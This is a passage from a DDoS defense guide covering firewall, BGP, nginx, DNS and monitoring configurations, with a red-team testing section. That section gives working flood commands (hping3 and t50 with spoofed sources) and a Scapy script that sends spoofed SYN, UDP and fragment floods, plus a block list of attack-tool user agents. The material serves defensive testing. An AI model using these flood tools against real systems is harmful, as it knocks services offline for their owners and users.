table inet connlimit {
    chain input {
        type filter hook input priority filter; policy accept;

        # Limit concurrent connections per source IP to port 80/443
        tcp dport {80, 443} \
          meter connlimit_http { ip saddr ct count over 100 } \
          counter reject with tcp reset

        # Limit concurrent connections per source IP to SSH
        tcp dport 22 \
          meter connlimit_ssh { ip saddr ct count over 3 } \
          counter drop

        # Global connection limit per source (all ports)
        ct state new \
          meter global_connlimit { ip saddr ct count over 500 } \
          counter drop
    }
}
```

### 4.4 UDP Amplification Prevention — BCP38/BCP84

BCP38 (RFC 2827) and BCP84 (RFC 3704) define Source Address Validation (SAV) — preventing IP spoofing at the network edge. If all networks implemented BCP38, reflection/amplification attacks would be impossible.

**Implementation on edge router (ingress filtering):**

```
! Cisco IOS — uRPF strict mode on customer-facing interface
interface GigabitEthernet0/0
  description Customer-facing
  ip verify unicast source reachable-via rx
  ! Drops packets with source address not in routing table via this interface

! Junos — strict uRPF
interfaces {
    ge-0/0/0 {
        unit 0 {
            family inet {
                rpf-check;
            }
        }
    }
}
```

**Linux reverse path filtering:**

```bash
# Strict mode — source IP must be reachable via incoming interface
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.eth0.rp_filter=1
```

### 4.5 ACLs for Known Attack Vectors

**nftables ruleset blocking common amplification sources:**

```bash
table inet anti_amplification {
    set bogon_networks {
        type ipv4_addr
        flags interval
        elements = {
            0.0.0.0/8,
            10.0.0.0/8,
            100.64.0.0/10,
            127.0.0.0/8,
            169.254.0.0/16,
            172.16.0.0/12,
            192.0.0.0/24,
            192.0.2.0/24,
            192.168.0.0/16,
            198.18.0.0/15,
            198.51.100.0/24,
            203.0.113.0/24,
            224.0.0.0/4,
            240.0.0.0/4
        }
    }

    chain input {
        type filter hook input priority raw; policy accept;

        # Drop traffic from bogon source addresses (spoofed)
        ip saddr @bogon_networks counter drop

        # Block common amplification ports from external (inbound)
        udp sport {19, 53, 123, 161, 389, 1900, 11211} \
          ip saddr != 10.0.0.0/8 \
          limit rate over 1000/second \
          counter drop

        # Drop invalid TCP flag combinations (crafted packets)
        tcp flags & (fin|syn|rst|psh|ack|urg) == 0 counter drop
        tcp flags & (fin|syn) == fin|syn counter drop
        tcp flags & (syn|rst) == syn|rst counter drop
        tcp flags & (fin|rst) == fin|rst counter drop
        tcp flags & (fin|psh|ack) == fin|psh counter drop
        tcp flags & (ack) == 0 tcp flags & (rst) == 0 tcp flags & (syn) == 0 counter drop
    }
}
```

### 4.6 Blackhole Routing

#### Selective Blackhole (Destination-Based RTBH)

```bash
# Linux — blackhole specific destination under attack
ip route add blackhole 203.0.113.50/32

# With source-based blackhole (if source is known)
ip route add blackhole 198.51.100.0/24
```

#### Triggered Blackhole via BGP

```
! Cisco IOS — configure RTBH trigger
ip route 192.0.2.1 255.255.255.255 Null0 tag 666

router bgp 65000
  neighbor 10.0.0.1 remote-as 65000
  neighbor 10.0.0.1 send-community
  !
  route-map BLACKHOLE permit 10
    match tag 666
    set community 65535:666 no-export
    set origin igp
    set local-preference 200
```

### 4.7 BGP Flowspec Rules for Surgical Filtering

**Real-world Flowspec deployment for multi-vector attack:**

```
# ExaBGP configuration for Flowspec announcements
process announce-routes {
    run /usr/bin/python3 /etc/exabgp/flowspec-controller.py;
    encoder json;
}

neighbor 10.0.0.1 {
    router-id 10.0.0.254;
    local-address 10.0.0.254;
    local-as 65000;
    peer-as 65000;
    family {
        ipv4 flow;
    }
}
```

**Python controller for dynamic Flowspec rules:**

```python
#!/usr/bin/env python3
"""ExaBGP Flowspec controller — announces/withdraws DDoS mitigation rules."""

import sys
import json
from time import sleep

def announce_rule(dst: str, protocol: str, port: str, action: str = "discard") -> None:
    """Announce a Flowspec rule via ExaBGP."""
    rule = (
        f"announce flow route {{ "
        f"match {{ destination {dst}/32; protocol {protocol}; destination-port {port}; }} "
        f"then {{ {action}; }} }}"
    )
    sys.stdout.write(rule + "\n")
    sys.stdout.flush()

def withdraw_rule(dst: str, protocol: str, port: str) -> None:
    """Withdraw a Flowspec rule."""
    rule = (
        f"withdraw flow route {{ "
        f"match {{ destination {dst}/32; protocol {protocol}; destination-port {port}; }} }}"
    )
    sys.stdout.write(rule + "\n")
    sys.stdout.flush()

# Block UDP flood to target on all ports
announce_rule("203.0.113.10", "udp", "1-1024")

# Rate limit DNS responses (source port 53) to 500 Mbps
sys.stdout.write(
    "announce flow route { "
    "match { destination 203.0.113.10/32; protocol udp; source-port 53; } "
    "then { rate-limit 500000000; } }\n"
)
sys.stdout.flush()

# Keep running (ExaBGP requires process to stay alive)
while True:
    sleep(60)
```

---

## 5. Application-Level Defenses

### 5.1 WAF Rate Limiting

#### Per-IP Rate Limiting (nginx)

```nginx
# /etc/nginx/conf.d/rate_limiting.conf

# Define rate limiting zones
limit_req_zone $binary_remote_addr zone=general:20m rate=30r/s;
limit_req_zone $binary_remote_addr zone=api:20m rate=10r/s;
limit_req_zone $binary_remote_addr zone=login:10m rate=3r/s;
limit_req_zone $binary_remote_addr zone=search:10m rate=5r/s;

# Connection limiting
limit_conn_zone $binary_remote_addr zone=perip:20m;
limit_conn_zone $server_name zone=perserver:10m;

server {
    listen 443 ssl http2;
    server_name example.com;

    # Global connection limits
    limit_conn perip 50;
    limit_conn perserver 10000;

    # General rate limiting
    location / {
        limit_req zone=general burst=60 nodelay;
        limit_req_status 429;
        proxy_pass http://backend;
    }

    # Strict API rate limiting
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        limit_req_status 429;

        # Additional per-API-key limiting via map
        limit_req zone=$api_key_zone burst=5 nodelay;
        proxy_pass http://api_backend;
    }

    # Very strict login rate limiting
    location /auth/login {
        limit_req zone=login burst=5 nodelay;
        limit_req_status 429;
        proxy_pass http://auth_backend;
    }

    # Search endpoint (expensive)
    location /search {
        limit_req zone=search burst=10 nodelay;
        limit_req_status 429;
        proxy_pass http://search_backend;
    }

    # Custom 429 error page
    error_page 429 /429.html;
    location = /429.html {
        internal;
        return 429 '{"error":"rate_limit_exceeded","retry_after":60}';
        add_header Content-Type application/json;
        add_header Retry-After 60;
    }
}
```

#### Per-Session and Geographic Rate Limiting

```nginx
# Geographic rate limiting using GeoIP2
geo $geo_rate_zone {
    default        normal;
    # Countries not relevant to business but common attack sources
    # (adjust per your actual traffic patterns)
    include /etc/nginx/geo_restrictive.conf;
}

map $geo_rate_zone $geo_limit {
    normal      "";
    restrictive "1";
}

# Apply stricter limits to geographic regions with no legitimate traffic
limit_req_zone $binary_remote_addr zone=geo_strict:10m rate=5r/s;

server {
    location / {
        if ($geo_limit = "1") {
            set $apply_geo_limit 1;
        }

        limit_req zone=geo_strict burst=10 nodelay;
        proxy_pass http://backend;
    }
}
```

### 5.2 CAPTCHA and Proof-of-Work Challenges

**Proof-of-Work challenge implementation concept (server-side validation):**

```python
#!/usr/bin/env python3
"""Proof-of-Work challenge for DDoS mitigation — server-side validator."""

import hashlib
import time
import secrets

DIFFICULTY = 20  # Number of leading zero bits required

def generate_challenge() -> dict:
    """Generate a PoW challenge for the client."""
    challenge = secrets.token_hex(32)
    timestamp = int(time.time())
    return {
        "challenge": challenge,
        "difficulty": DIFFICULTY,
        "timestamp": timestamp,
        "expires": timestamp + 30  # 30-second validity
    }

def verify_solution(challenge: str, nonce: str, difficulty: int, expires: int) -> bool:
    """Verify client's PoW solution."""
    if int(time.time()) > expires:
        return False

    data = f"{challenge}{nonce}".encode()
    hash_result = hashlib.sha256(data).hexdigest()
    binary = bin(int(hash_result, 16))[2:].zfill(256)

    return binary[:difficulty] == "0" * difficulty
```

### 5.3 JavaScript Challenges — Bot Detection

JavaScript challenges force clients to execute code before access is granted, filtering bots that cannot run JavaScript. The challenge page is served first; only after successful execution is the real content delivered.

**Implementation approach:**

```html
<!-- Challenge page served during suspected DDoS -->
<!DOCTYPE html>
<html>
<head><title>Checking your browser...</title></head>
<body>
<p>Please wait while we verify your browser...</p>
<script>
(function() {
    // Timing-based challenge — legitimate browsers solve in <2s
    const start = performance.now();
    const challenge = document.cookie.match(/ddos_challenge=([^;]+)/);
    if (!challenge) { location.reload(); return; }

    // Compute solution (legitimate browsers handle this easily)
    let solution = 0;
    const target = parseInt(challenge[1], 16);
    for (let i = 0; i < 1000000; i++) {
        if ((i ^ target) % 7919 === 0) { solution = i; break; }
    }

    const elapsed = performance.now() - start;

    // Submit solution
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/__ddos_verify';

    const fields = {solution, elapsed: Math.round(elapsed), ts: Date.now()};
    Object.entries(fields).forEach(([k, v]) => {
        const input = document.createElement('input');
        input.type = 'hidden'; input.name = k; input.value = v;
        form.appendChild(input);
    });

    document.body.appendChild(form);
    form.submit();
})();
</script>
</body>
</html>
```

### 5.4 Behavioral Analysis

Distinguishing legitimate users from attack bots requires analyzing behavioral patterns:

**Signals that indicate bot traffic:**

| Signal | Legitimate User | Attack Bot |
|--------|----------------|------------|
| Request interval | Variable (human hesitation) | Constant (machine precision) |
| Page sequence | Logical navigation flow | Random/sequential URL crawl |
| Mouse/keyboard events | Present (JS fingerprint) | Absent |
| Session duration | Minutes to hours | Seconds (hit and move) |
| Referer header | Consistent navigation | Missing or spoofed |
| TLS fingerprint (JA3) | Known browser hash | Unknown/library hash |
| HTTP/2 settings frame | Browser-like values | Library defaults |

**JA3 fingerprint for bot detection (nginx + Lua):**

```nginx
# Log JA3 fingerprint for analysis
lua_ssl_client_hello_by_lua_block {
    local ssl = require "ngx.ssl"
    local ja3_hash = compute_ja3(ssl.get_client_hello())
    ngx.var.ja3_fingerprint = ja3_hash
}

# Block known bot JA3 fingerprints
map $ja3_fingerprint $is_known_bot {
    default 0;
    "e7d705a3286e19ea42f587b344ee6865" 1;  # Python requests
    "b32309a26951912be7dba376398abc3b" 1;  # Go default
    "6734f37431670b3ab4292b8f60f29984" 1;  # curl
}
```

### 5.5 API Rate Limiting

**Per-key, per-endpoint, adaptive rate limiting:**

```nginx
# /etc/nginx/conf.d/api_ratelimit.conf

# Extract API key from header
map $http_x_api_key $api_key_for_limit {
    default $binary_remote_addr;
    "~^.+$" $http_x_api_key;
}

# Different rate zones per endpoint class
limit_req_zone $api_key_for_limit zone=api_read:20m rate=100r/s;
limit_req_zone $api_key_for_limit zone=api_write:20m rate=20r/s;
limit_req_zone $api_key_for_limit zone=api_search:10m rate=5r/s;
limit_req_zone $api_key_for_limit zone=api_export:5m rate=1r/m;

server {
    # Read operations — generous limit
    location ~ ^/api/v[0-9]+/(users|products|orders)$ {
        limit_req zone=api_read burst=200 nodelay;
        proxy_pass http://api;
    }

    # Write operations — stricter limit
    location ~ ^/api/v[0-9]+/(users|products|orders)/(create|update|delete) {
        limit_req zone=api_write burst=40 nodelay;
        proxy_pass http://api;
    }

    # Search — expensive, strict limit
    location ~ ^/api/v[0-9]+/search {
        limit_req zone=api_search burst=10 nodelay;
        proxy_pass http://api;
    }

    # Export — very expensive, extremely strict
    location ~ ^/api/v[0-9]+/.*/export {
        limit_req zone=api_export burst=2 nodelay;
        proxy_pass http://api;
    }
}
```

### 5.6 Connection Limits

**nginx connection and request limiting:**

```nginx
# Concurrent connections per IP
limit_conn_zone $binary_remote_addr zone=conn_per_ip:20m;

# Concurrent connections per server
limit_conn_zone $server_name zone=conn_per_server:5m;

server {
    # Max 50 concurrent connections per IP
    limit_conn conn_per_ip 50;
    limit_conn_log_level warn;

    # Max 10000 total connections to this server
    limit_conn conn_per_server 10000;

    # Client body size limit (anti-RUDY)
    client_max_body_size 10m;

    # Timeouts (anti-Slowloris)
    client_header_timeout 10s;
    client_body_timeout 10s;
    send_timeout 10s;

    # Limit request line and header size
    large_client_header_buffers 4 8k;

    # Keep-alive limits
    keepalive_timeout 15s;
    keepalive_requests 100;
}
```

### 5.7 HTTP Request Validation

**nginx request validation for DDoS filtering:**

```nginx
server {
    # Block requests with missing Host header
    if ($host = '') {
        return 444;
    }

    # Block requests with invalid methods
    if ($request_method !~ ^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)$) {
        return 405;
    }

    # Block requests without proper User-Agent
    if ($http_user_agent = '') {
        return 403;
    }

    # Block known attack tool User-Agents
    if ($http_user_agent ~* (slowloris|nikto|havij|sqlmap|masscan|zgrab)) {
        return 403;
    }

    # Require valid Accept header for API requests
    location /api/ {
        if ($http_accept !~ (application/json|text/html|\*/\*)) {
            return 406;
        }
        proxy_pass http://api;
    }

    # Block requests with excessively long URIs (buffer overflow attempts + cache busting)
    if ($request_uri ~* "^.{4096,}$") {
        return 414;
    }
}
```

---

## 6. DNS DDoS Protection

### 6.1 Authoritative DNS Protection

Authoritative DNS servers are high-value targets. If your authoritative DNS is down, ALL services become unreachable regardless of their individual availability.

#### Anycast DNS Deployment

Deploy authoritative nameservers using anycast. The same IP is announced from multiple geographic locations. Attack traffic distributes across all nodes automatically.

**Minimum architecture:**

```
ns1.example.com → Anycast IP 198.51.100.1
  Announced from: NYC, LON, TYO, SYD, FRA
  Each node: dedicated DDoS mitigation + DNS software

ns2.example.com → Anycast IP 198.51.100.2
  Announced from: ORD, AMS, SIN, GRU, JNB
  Separate anycast cloud for independence
```

#### Overprovisioning

Size authoritative DNS infrastructure for 100x normal query volume. Normal baseline might be 10,000 qps; design for 1,000,000 qps sustained.

**BIND tuning for high query rates:**

```
// /etc/bind/named.conf.options
options {
    // Increase worker threads
    recursive-clients 0;  // Authoritative only — disable recursion
    tcp-clients 1000;
    tcp-listen-queue 10;

    // Rate limiting for authoritative responses
    rate-limit {
        responses-per-second 100;      // Per-prefix response rate
        referrals-per-second 10;
        nodata-per-second 10;
        nxdomains-per-second 10;
        errors-per-second 5;
        all-per-second 1000;
        window 15;                     // 15-second sliding window
        ipv4-prefix-length 24;         // Group by /24
        ipv6-prefix-length 56;
        slip 2;                        // Truncate every 2nd excess response
        qps-scale 250;                 // Scale limits with QPS
        exempt-clients { 10.0.0.0/8; 172.16.0.0/12; };
    };
};
```

#### DNS Rate Limiting (RRL)

Response Rate Limiting prevents DNS amplification by limiting the rate of identical responses to the same requestor prefix.

**PowerDNS RRL configuration:**

```lua
-- /etc/pdns/pdns.conf
-- Enable RRL
server-id=ns1.example.com
lua-config-file=/etc/pdns/rrl.lua
```

```lua
-- /etc/pdns/rrl.lua
-- Response Rate Limiting configuration
rpzFile("/etc/pdns/rpz.zone")

-- NSD-style RRL
setRRL({
    ["responses-per-second"] = 100,
    ["nxdomains-per-second"] = 50,
    ["referrals-per-second"] = 30,
    ["errors-per-second"] = 20,
    ["slip"] = 2,
    ["ipv4-prefix-length"] = 24,
    ["ipv6-prefix-length"] = 48,
    ["window"] = 15,
})
```

### 6.2 Recursive Resolver Protection

#### Query Rate Limiting

```
// Unbound configuration for DDoS resilience
server:
    # Rate limiting inbound queries
    ip-ratelimit: 1000           # Queries per second per IP
    ip-ratelimit-slabs: 4
    ip-ratelimit-size: 4m

    # Outbound query rate limiting (prevents being used as amplifier)
    outgoing-num-tcp: 100
    outgoing-range: 8192

    # Cache optimization (reduce backend query load)
    cache-max-ttl: 86400
    cache-min-ttl: 300
    prefetch: yes
    prefetch-key: yes
    serve-expired: yes
    serve-expired-ttl: 86400

    # Aggressive NSEC (minimize NXDOMAIN queries)
    aggressive-nsec: yes

    # Limit TCP connections
    incoming-num-tcp: 1000
    tcp-idle-timeout: 30000
```

### 6.3 DNS Amplification Prevention

**Disable open recursion (BIND):**

```
options {
    // Only allow recursion for internal clients
    allow-recursion { 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; };
    allow-query-cache { 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; };

    // Disable ANY query type (reduces amplification)
    minimal-any yes;

    // Limit response size
    max-udp-size 1232;       // Avoid fragmentation
    edns-udp-size 1232;
};
```

**Firewall rules to prevent DNS amplification:**

```bash
# nftables — limit outbound DNS response rate
table inet dns_protection {
    chain output {
        type filter hook output priority filter; policy accept;

        # Rate limit outbound DNS responses (prevent being used as amplifier)
        udp sport 53 \
          meter dns_response_rate { ip daddr limit rate over 100/second burst 200 packets } \
          counter drop
    }

    chain input {
        type filter hook input priority filter; policy accept;

        # Block external recursive queries
        udp dport 53 ip saddr != { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 } \
          counter drop

        # Rate limit allowed DNS queries
        udp dport 53 \
          meter dns_query_rate { ip saddr limit rate over 50/second burst 100 packets } \
          counter drop
    }
}
```

### 6.4 NXDOMAIN Flood Mitigation

NXDOMAIN floods query random subdomains (e.g., `askdhf.example.com`, `bwerj.example.com`) to exhaust resolver caches and force the authoritative server to process each query. Cache entries for NXDOMAIN responses still consume memory.

**Defenses:**

```
// Unbound — aggressive NSEC use (RFC 8198)
// Synthesize NXDOMAIN responses from cached NSEC records
// without querying authoritative for every random subdomain
server:
    aggressive-nsec: yes
    neg-cache-size: 100m     # Large negative cache
    cache-max-negative-ttl: 3600
```

**iptables rule to rate-limit DNS queries per source:**

```bash
# Rate limit DNS queries per source IP
iptables -A INPUT -p udp --dport 53 \
  -m hashlimit \
  --hashlimit-name dns_query \
  --hashlimit-above 50/sec \
  --hashlimit-burst 100 \
  --hashlimit-mode srcip \
  --hashlimit-htable-expire 60000 \
  -j DROP
```

### 6.5 DNS Water Torture Defense

Water torture attacks target a specific domain with random subdomain queries (`random123.target.com`). The resolver cannot cache results (each query is unique) and must forward to the authoritative server, which is overwhelmed.

**Detection signals:**

- Massive increase in NXDOMAIN responses for one domain
- All queries are subdomains of a single parent zone
- Subdomains appear random (high entropy in subdomain labels)
- Query sources are distributed (botnet)

**RPZ (Response Policy Zone) mitigation:**

```
// When water torture detected against target.com:
// Temporarily add wildcard NXDOMAIN to RPZ
*.target.com CNAME .    ; Force NXDOMAIN without querying authoritative
```

### 6.6 Redundant DNS Architecture

**Multi-provider DNS strategy:**

```
example.com.   IN NS   ns1.primary-provider.net.    ; Primary (Cloudflare/Route53)
example.com.   IN NS   ns2.primary-provider.net.
example.com.   IN NS   ns1.secondary-provider.com.  ; Secondary (different provider)
example.com.   IN NS   ns2.secondary-provider.com.
example.com.   IN NS   ns1.self-hosted.example.com. ; Self-hosted tertiary (anycast)
```

**Zone transfer security between providers:**

```
// Primary BIND configuration — allow AXFR to secondaries only
options {
    allow-transfer {
        key "transfer-key";           // TSIG authentication
        198.51.100.10;                // Secondary provider IP
        203.0.113.20;                 // Tertiary NS IP
    };
    also-notify {
        198.51.100.10;
        203.0.113.20;
    };
};

key "transfer-key" {
    algorithm hmac-sha256;
    secret "base64encodedkey==";
};
```

---

## 7. Testing e Red Team DDoS

### 7.1 Authorized Stress Testing — Methodology

**CRITICAL: DDoS testing requirements:**

1. **Written authorization** from asset owner (signed document, not verbal)
2. **Defined scope**: Target IPs/domains, maximum volume, attack types, duration
3. **Time window**: Agreed testing window with all stakeholders notified
4. **Abort procedure**: Kill switch to immediately stop testing
5. **ISP notification**: Upstream ISP informed to prevent automated blocking
6. **Monitoring ready**: All monitoring systems active with alerting staff aware
7. **Rollback plan**: Procedure to restore service if testing causes unexpected damage

**Rules of engagement template:**

```
DDoS Resilience Test — Rules of Engagement
Date: [DATE]
Authorization: [SIGNED BY ASSET OWNER]

SCOPE:
- Target: [IP/CIDR/Domain]
- Maximum volume: [X Gbps / Y Mpps / Z RPS]
- Vectors: [SYN flood, HTTP flood, etc.]
- Duration: Maximum [N] minutes per test
- Window: [DATE/TIME] to [DATE/TIME] UTC

FORBIDDEN:
- Production traffic disruption beyond target
- Exceeding stated maximum volume
- Testing outside authorized window
- Targeting shared infrastructure without explicit inclusion
- Using third-party reflectors/amplifiers (illegal regardless of authorization)

ABORT CONDITIONS:
- Collateral impact detected on non-target systems
- Customer reports received
- ISP intervention
- Test exceeds authorized volume

CONTACTS:
- Test lead: [NAME/PHONE]
- NOC: [NAME/PHONE]
- ISP NOC: [NAME/PHONE]
- Executive escalation: [NAME/PHONE]
```

### 7.2 Attack Tools — Understanding (Red Team Context)

#### hping3

Packet crafting tool for protocol-level testing. Can generate SYN floods, ACK floods, UDP floods, and custom packet sequences.

```bash
# SYN flood test (AUTHORIZED TESTING ONLY)
# -S: SYN flag, -p: dest port, --flood: max rate, --rand-source: random source IPs
hping3 -S -p 80 --flood --rand-source <target_ip>

# SYN flood with specific packet size
hping3 -S -p 443 --flood --rand-source -d 1400 <target_ip>

# ACK flood test
hping3 -A -p 80 --flood --rand-source <target_ip>

# UDP flood to specific port
hping3 --udp -p 53 --flood --rand-source -d 1200 <target_ip>

# ICMP flood
hping3 --icmp --flood -d 1472 <target_ip>

# Controlled SYN flood (rate-limited for threshold testing)
hping3 -S -p 80 -i u1000 --rand-source <target_ip>  # ~1000 pps
hping3 -S -p 80 -i u100 --rand-source <target_ip>   # ~10000 pps
```

#### LOIC/HOIC

Low Orbit Ion Cannon (LOIC) and High Orbit Ion Cannon (HOIC) — used by Anonymous and script kiddies. Generate HTTP/TCP/UDP floods from the attacker's real IP (no spoofing). Primarily useful for understanding what unsophisticated attacks look like in logs.

**Characteristics:**

- No IP spoofing — attacker's real IP visible
- Simple HTTP GET/POST floods or raw TCP/UDP
- HOIC adds scripting ("booster scripts") for randomized requests
- Easily detectable and blockable by IP
- Legal to possess but illegal to use against targets without authorization

#### T50 (Multi-Protocol Packet Injector)

Capable of generating traffic for multiple protocols simultaneously:

```bash
# Multi-protocol flood (AUTHORIZED TESTING ONLY)
t50 <target_ip> --flood --turbo \
  --protocol TCP \
  --dport 80 \
  --syn

# UDP-based test
t50 <target_ip> --flood --turbo \
  --protocol UDP \
  --dport 53
```

#### Scapy — Custom Packet Crafting

```python
#!/usr/bin/env python3
"""DDoS testing with Scapy — AUTHORIZED TESTING ONLY."""

from scapy.all import IP, TCP, UDP, send, RandShort, RandIP, Raw
import sys

TARGET = sys.argv[1]  # Target IP from command line

def syn_flood(target: str, port: int, count: int) -> None:
    """Generate SYN flood packets for testing."""
    packet = (
        IP(src=RandIP(), dst=target) /
        TCP(sport=RandShort(), dport=port, flags="S") /
        Raw(b"X" * 1024)
    )
    send(packet, count=count, verbose=False)
    print(f"Sent {count} SYN packets to {target}:{port}")

def udp_flood(target: str, port: int, count: int) -> None:
    """Generate UDP flood packets for testing."""
    packet = (
        IP(src=RandIP(), dst=target) /
        UDP(sport=RandShort(), dport=port) /
        Raw(b"X" * 1400)
    )
    send(packet, count=count, verbose=False)
    print(f"Sent {count} UDP packets to {target}:{port}")

def fragmentation_attack(target: str, count: int) -> None:
    """Generate fragmented packets for testing reassembly limits."""
    # First fragment
    frag1 = (
        IP(src=RandIP(), dst=target, flags="MF", frag=0) /
        UDP(sport=RandShort(), dport=80) /
        Raw(b"A" * 1400)
    )
    # Second fragment (never sent — leaves reassembly buffer allocated)
    send(frag1, count=count, verbose=False)
    print(f"Sent {count} incomplete fragments to {target}")

if __name__ == "__main__":
    print("[!] AUTHORIZED TESTING ONLY — Verify written authorization before proceeding")
    syn_flood(TARGET, 80, 10000)
```

### 7.3 Cloud-Based Load Testing

Legitimate stress testing using cloud infrastructure for high-volume HTTP testing:

```bash
# Using k6 (Grafana k6) for HTTP load testing
# Install: https://k6.io/docs/getting-started/installation/

# k6 script for DDoS resilience testing
cat > ddos_resilience_test.js << 'EOF'
import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
    scenarios: {
        // Ramp up to test threshold
        stress_test: {
            executor: 'ramping-vus',
            startVUs: 0,
            stages: [
                { duration: '2m', target: 100 },    // Warm up
                { duration: '5m', target: 1000 },   // Ramp to stress level
                { duration: '10m', target: 5000 },  // Sustained stress
                { duration: '5m', target: 10000 },  // Peak (DDoS simulation)
                { duration: '5m', target: 0 },      // Recovery
            ],
            gracefulRampDown: '30s',
        },
    },
    thresholds: {
        http_req_duration: ['p(95)<3000'],   // 95th percentile < 3s
        http_req_failed: ['rate<0.1'],        // Less than 10% failure
    },
};

export default function () {
    const res = http.get('https://target.example.com/');
    check(res, {
        'status is 200': (r) => r.status === 200,
        'response time < 2000ms': (r) => r.timings.duration < 2000,
    });
    sleep(Math.random() * 2);  // Random think time
}
EOF

# Run the test
k6 run --out influxdb=http://localhost:8086/k6 ddos_resilience_test.js
```

### 7.4 Evaluating DDoS Resilience

**Threshold testing checklist:**

| Test | Method | Success Criteria |
|------|--------|-----------------|
| Volumetric threshold | Gradually increase UDP flood volume | Mitigation activates before service degrades |
| SYN flood resilience | hping3 SYN flood at increasing rates | SYN cookies activate, connections still accepted |
| Connection exhaustion | Open max connections, verify limit | New connections rejected gracefully, existing work |
| HTTP flood threshold | k6 ramp to high RPS | Rate limiting activates, legitimate users still served |
| Slowloris resilience | Open slow connections | Timeout kills slow connections, doesn't block others |
| Failover verification | Exceed on-prem capacity | Cloud scrubbing activates automatically |
| Recovery time | Stop attack, measure recovery | Service fully recovers within 60 seconds |

---

## 8. Monitoraggio e Detection

### 8.1 Baseline Traffic Analysis

Effective DDoS detection requires understanding normal traffic patterns. Without a reliable baseline, every traffic spike triggers false positives.

**Key baseline metrics:**

- **Bandwidth utilization**: Average, peak, standard deviation per interface
- **Packets per second**: Protocol breakdown (TCP/UDP/ICMP ratios)
- **Connection rate**: New connections per second (SYN rate)
- **Active connections**: Concurrent connection count
- **DNS query rate**: Queries per second to authoritative/recursive servers
- **HTTP request rate**: Requests per second per endpoint
- **Geographic distribution**: Traffic origin by country/ASN
- **Temporal patterns**: Hour-of-day, day-of-week, seasonal variations

**Baseline collection script (NetFlow/sFlow summary):**

```bash
#!/bin/bash
# baseline_collector.sh — Collect traffic baselines every 5 minutes
# Run via cron: */5 * * * * /opt/ddos/baseline_collector.sh

TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
LOGFILE="/var/log/ddos/baseline.jsonl"

# Interface statistics
RX_BYTES=$(cat /sys/class/net/eth0/statistics/rx_bytes)
TX_BYTES=$(cat /sys/class/net/eth0/statistics/tx_bytes)
RX_PACKETS=$(cat /sys/class/net/eth0/statistics/rx_packets)
TX_PACKETS=$(cat /sys/class/net/eth0/statistics/tx_packets)

# Connection tracking
CONNS_TOTAL=$(cat /proc/sys/net/netfilter/nf_conntrack_count 2>/dev/null || echo 0)
CONNS_MAX=$(cat /proc/sys/net/netfilter/nf_conntrack_max 2>/dev/null || echo 0)

# SYN queue
SYN_RECV=$(ss -tn state syn-recv | wc -l)
ESTABLISHED=$(ss -tn state established | wc -l)

# TCP stats
TCP_STATS=$(ss -s | grep "TCP:" | head -1)

printf '{"ts":"%s","rx_bytes":%s,"tx_bytes":%s,"rx_pps":%s,"tx_pps":%s,"conns":%s,"conns_max":%s,"syn_recv":%s,"established":%s}\n' \
    "$TIMESTAMP" "$RX_BYTES" "$TX_BYTES" "$RX_PACKETS" "$TX_PACKETS" \
    "$CONNS_TOTAL" "$CONNS_MAX" "$SYN_RECV" "$ESTABLISHED" >> "$LOGFILE"
```

### 8.2 Anomaly Detection

**Detection rules based on baseline deviation:**

```python
#!/usr/bin/env python3
"""DDoS anomaly detection — compares current metrics against baseline."""

import json
import sys
from dataclasses import dataclass
from pathlib import Path

BASELINE_FILE = Path("/var/log/ddos/baseline_stats.json")
ALERT_MULTIPLIER = 5.0  # Alert when metric exceeds 5x baseline average

@dataclass
class Alert:
    severity: str
    metric: str
    current: float
    baseline: float
    multiplier: float

def load_baseline() -> dict:
    """Load computed baseline statistics."""
    with open(BASELINE_FILE) as f:
        return json.load(f)

def check_metrics(current: dict, baseline: dict) -> list[Alert]:
    """Compare current metrics against baseline, return alerts."""
    alerts: list[Alert] = []

    checks = [
        ("rx_bps", "Inbound bandwidth", 5.0, "CRITICAL"),
        ("rx_pps", "Inbound packet rate", 5.0, "CRITICAL"),
        ("syn_rate", "SYN rate", 3.0, "HIGH"),
        ("udp_pps", "UDP packet rate", 4.0, "HIGH"),
        ("conn_rate", "New connection rate", 3.0, "HIGH"),
        ("dns_qps", "DNS query rate", 4.0, "CRITICAL"),
        ("http_rps", "HTTP request rate", 3.0, "HIGH"),
        ("icmp_pps", "ICMP rate", 10.0, "MEDIUM"),
    ]

    for metric, description, threshold, severity in checks:
        if metric in current and metric in baseline:
            current_val = current[metric]
            baseline_val = baseline[metric]["average"]
            if baseline_val > 0:
                multiplier = current_val / baseline_val
                if multiplier > threshold:
                    alerts.append(Alert(
                        severity=severity,
                        metric=description,
                        current=current_val,
                        baseline=baseline_val,
                        multiplier=round(multiplier, 2)
                    ))

    return alerts

def classify_attack(alerts: list[Alert]) -> str:
    """Attempt to classify attack vector based on anomalous metrics."""
    metrics_elevated = {a.metric for a in alerts}

    if "Inbound bandwidth" in metrics_elevated and "UDP packet rate" in metrics_elevated:
        return "VOLUMETRIC_UDP_AMPLIFICATION"
    elif "SYN rate" in metrics_elevated and "Inbound bandwidth" not in metrics_elevated:
        return "PROTOCOL_SYN_FLOOD"
    elif "HTTP request rate" in metrics_elevated and "Inbound bandwidth" not in metrics_elevated:
        return "APPLICATION_LAYER_HTTP_FLOOD"
    elif "DNS query rate" in metrics_elevated:
        return "DNS_FLOOD"
    elif "Inbound bandwidth" in metrics_elevated:
        return "VOLUMETRIC_GENERIC"
    else:
        return "UNCLASSIFIED"

if __name__ == "__main__":
    baseline = load_baseline()
    # current would come from real-time monitoring (placeholder)
    current = json.loads(sys.stdin.read())
    alerts = check_metrics(current, baseline)

    if alerts:
        classification = classify_attack(alerts)
        print(f"[ALERT] Attack classification: {classification}")
        for alert in sorted(alerts, key=lambda a: a.multiplier, reverse=True):
            print(f"  [{alert.severity}] {alert.metric}: "
                  f"{alert.current:.0f} (baseline: {alert.baseline:.0f}, "
                  f"{alert.multiplier}x)")
```

### 8.3 NetFlow/sFlow Analysis

**nfdump queries for DDoS identification:**

```bash
# Top source IPs by volume (identify reflectors/bots)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s srcip/bytes \
  -n 20 \
